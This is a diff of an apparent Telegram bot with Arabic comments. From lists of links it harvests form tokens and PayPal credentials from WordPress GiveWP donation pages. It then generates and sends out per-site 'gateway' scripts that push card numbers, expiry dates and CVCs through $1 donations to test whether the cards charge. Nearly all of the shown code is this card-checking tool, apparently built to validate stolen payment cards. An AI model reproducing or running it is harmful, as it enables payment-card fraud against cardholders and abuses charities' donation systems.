+        links = [link.strip() for link in links if link.strip()]
+
+        if not links:
+            bot.reply_to(message, "File is empty.")
+            return
+
+        total = len(links)
+        status_msg = bot.reply_to(message, f"⏳ Processing {total} links...")
+        success_count = 0
+        files_sent = []
+
+        for i, link in enumerate(links, 1):
+            try:
+                if not link.startswith(("http://", "https://")):
+                    continue
+
+                # استخدام نفس كود السحب الأصلي
+                user = generate_user_agent()
+                r = requests.Session()
+                headers = {'user-agent': user}
+                res = r.get(url=link, headers=headers, timeout=15).text
+                
+                id_form1 = re.search(r'name="give-form-id-prefix" value="(.*?)"', res)
+                id_form2 = re.search(r'name="give-form-id" value="(.*?)"', res)
+                nonec = re.search(r'name="give-form-hash" value="(.*?)"', res)
+                anc = re.search(r'"data-client-token":"(.*?)"', res)
+                
+                if not all([id_form1, id_form2, nonec, anc]):
+                    continue
+                
+                id_form1 = id_form1.group(1)
+                id_form2 = id_form2.group(1)
+                nonec = nonec.group(1)
+                enc = anc.group(1)
+                dec = base64.b64decode(enc).decode('utf-8')
+                au = re.search(r'"accessToken":"(.*?)"', dec).group(1)
+                
+                parsed = urlparse(link)
+                USER_URL2 = f'https://{parsed.netloc}'
+                USER_URL = parsed.path
+
+                headers = {
+                    'origin': f'{USER_URL2}',
+                    'referer': f'{USER_URL}',
+                    'user-agent': 'Mozilla/5.0',
+                    'x-requested-with': 'XMLHttpRequest',
+                }
+
+                data = MultipartEncoder({
+                    'give-form-id-prefix': (None, id_form1),
+                    'give-form-id': (None, id_form2),
+                    'give-form-hash': (None, nonec),
+                    'give-amount': (None, '1.00'),
+                    'payment-mode': (None, 'paypal-commerce'),
+                    'give_first': (None, 'Test'),
+                    'give_last': (None, 'User'),
+                    'give_email': (None, 'test@gmail.com'),
+                    'give-gateway': (None, 'paypal-commerce'),
+                })
+                
+                headers['content-type'] = data.content_type
+                params = {'action': 'give_paypal_commerce_create_order'}
+                
+                response = r.post(f'{USER_URL2}/wp-admin/admin-ajax.php', params=params, cookies=r.cookies, headers=headers, data=data)
+                tok = response.json()['data']['id']
+
+                # انشاء ملف Python
+                text_content = f'''import requests, re, random, time, base64
+from fake_useragent import UserAgent
+from requests_toolbelt.multipart.encoder import MultipartEncoder
+from urllib.parse import urlparse
+
+class PayPal:
+    def __init__(self):
+        self.first_name = ["James", "John", "Robert", "Michael", "William"]
+        self.last_name = ["Smith", "Johnson", "Williams", "Brown", "Jones"]
+        self.paypal = "b220b06032291ef03c4bd21a74cab3ad"
+        self.donation = "1.00"
+        self.id_form1 = "{id_form1}"
+        self.id_form2 = "{id_form2}"
+        self.nonec = "{nonec}"
+        self.au = "{au}"
+        url = '{link}'
+        parsed = urlparse(url)
+        self.url = parsed.netloc
+        self.inurl = parsed.path
+        self.email = f"{{random.choice(self.first_name)}}{{random.randint(100,999)}}@gmail.com"
+        self.r = requests.Session()
+        self.uu = UserAgent()
+
+    def Key(self):
+        return self.au, self.id_form1, self.id_form2, self.nonec
+
+    def Charge(self, ccx):
+        ccx = ccx.strip()
+        n = ccx.split("|")[0]
+        mm = ccx.split("|")[1]
+        yy = ccx.split("|")[2]
+        cvc = ccx.split("|")[3].strip()
+        if "20" in yy:
+            yy = yy.split("20")[1]
+        
+        da2 = MultipartEncoder({{
+            'give-form-id-prefix': (None, self.id_form1),
+            'give-form-id': (None, self.id_form2),
+            'give-form-hash': (None, self.nonec),
+            'give-amount': (None, self.donation),
+            'payment-mode': (None, 'paypal-commerce'),
+            'give_first': (None, random.choice(self.first_name)),
+            'give_last': (None, random.choice(self.last_name)),
+            'give_email': (None, self.email),
+            'give-gateway': (None, 'paypal-commerce'),
+        }})
+        he3 = {{'content-type': da2.content_type, 'user-agent': self.uu.random}}
+        pa1 = {{'action': 'give_paypal_commerce_create_order'}}
+        r3 = self.r.post(f'https://{{self.url}}/wp-admin/admin-ajax.php', params=pa1, headers=he3, data=da2).json()['data']['id']
+
+        he4 = {{
+            'authorization': f'Bearer {{self.au}}',
+            'paypal-client-metadata-id': self.paypal,
+            'user-agent': self.uu.random,
+        }}
+        da3 = {{
+            'payment_source': {{
+                'card': {{
+                    'number': n, 'expiry': f'20{{yy}}-{{mm}}', 'security_code': cvc,
+                    'attributes': {{'verification': {{'method': 'SCA_WHEN_REQUIRED'}}}},
+                }},
+            }},
+            'application_context': {{'vault': False}},
+        }}
+        self.r.post(f'https://cors.api.paypal.com/v2/checkout/orders/{{r3}}/confirm-payment-source', headers=he4, json=da3)
+
+        da4 = MultipartEncoder({{
+            'give-form-id-prefix': (None, self.id_form1),
+            'give-form-id': (None, self.id_form2),
+            'give-form-hash': (None, self.nonec),
+            'give-amount': (None, self.donation),
+            'payment-mode': (None, 'paypal-commerce'),
+            'give_first': (None, random.choice(self.first_name)),
+            'give_last': (None, random.choice(self.last_name)),
+            'give_email': (None, self.email),
+            'give-gateway': (None, 'paypal-commerce'),
+        }})
+        he5 = {{'content-type': da4.content_type, 'user-agent': self.uu.random}}
+        pa2 = {{'action': 'give_paypal_commerce_approve_order', 'order': r3}}
+        r5 = self.r.post(f'https://{{self.url}}/wp-admin/admin-ajax.php', params=pa2, headers=he5, data=da4)
+        
+        text = r5.text
+        if 'true' in text: return 'CHARGE 1.00$'
+        elif 'INSUFFICIENT_FUNDS' in text: return "INSUFFICIENT_FUNDS"
+        elif 'ORDER_NOT_APPROVED' in text: return "ORDER_NOT_APPROVED"
+        else:
+            try: return r5.json()['data']['error']
+            except: return "UNKNOWN_ERROR"
+
+if __name__ == '__main__':
+    print('PayPal Gateway - Dev: @nnunrr')
+    ar = input('Enter Card (n|mm|yy|cvc): ')
+    rr = PayPal()
+    resulti = rr.Charge(ar)
+    print('Response: ' + resulti)
+'''
+                success_count += 1
+                safe_name = re.sub(r'[^a-zA-Z0-9]', '_', link[:30])
+                file_name = f'gateway_{i}_{safe_name}.py'
+                with open(file_name, "w", encoding="utf-8") as f:
+                    f.write(text_content)
+                with open(file_name, "rb") as f:
+                    bot.send_document(
+                        message.chat.id, f,
+                        caption=f"Gateway #{i} ✅\nLink: {link}\nDev: @nnunrr"
+                    )
+                os.remove(file_name)
+                files_sent.append(i)
+
+            except Exception as e:
+                pass
+
+            if i % 3 == 0 or i == total:
+                try:
+                    bot.edit_message_text(f"⏳ Progress: {i}/{total} | Extracted: {len(files_sent)}", message.chat.id, status_msg.message_id)
+                except:
+                    pass
+            time.sleep(1)
+
+        bot.send_message(message.chat.id, f"<b>📊 Bulk Extraction Complete</b>\n\nTotal: {total}\nExtracted: {len(files_sent)}\n\nDev: @nnunrr", parse_mode="HTML")
+
+    except Exception as e:
+        bot.reply_to(message, f"Error: {e}")
+
+# === نظام الحظر ===
+@bot.message_handler(commands=['block2'])
+def block_user(message):
+    if str(message.from_user.id) not in admins:
+        bot.reply_to(message, "You do not have permission.")
+        return
+    try:
+        user_id_to_block = message.text.split()[1]
+        with open('blockusers.txt', 'a') as file:
+            file.write(f"{user_id_to_block}\n")
+        bot.reply_to(message, f"User ID {user_id_to_block} blocked.")
+    except:
+        bot.reply_to(message, "Usage: /block2 [user_id]")
+
+@bot.message_handler(commands=['unblock2'])
+def unblock_user(message):
+    if str(message.from_user.id) not in admins:
+        bot.reply_to(message, "You do not have permission.")
+        return
+    try:
+        user_id_to_unblock = message.text.split()[1]
+        with open('blockusers.txt', 'r') as file:
+            lines = file.readlines()
+        with open('blockusers.txt', 'w') as file:
+            for line in lines:
+                if line.strip() != user_id_to_unblock:
+                    file.write(line)
+        bot.reply_to(message, f"User ID {user_id_to_unblock} unblocked.")
+    except:
+        bot.reply_to(message, "Usage: /unblock2 [user_id]")
+
+# === تشغيل البوت ===
+print('- Bot is running...')
+while True:
+    try:
+        bot.infinity_polling(none_stop=True)
+    except Exception as e:
+        print(f'- Error: {e}')
+        time.sleep(5)
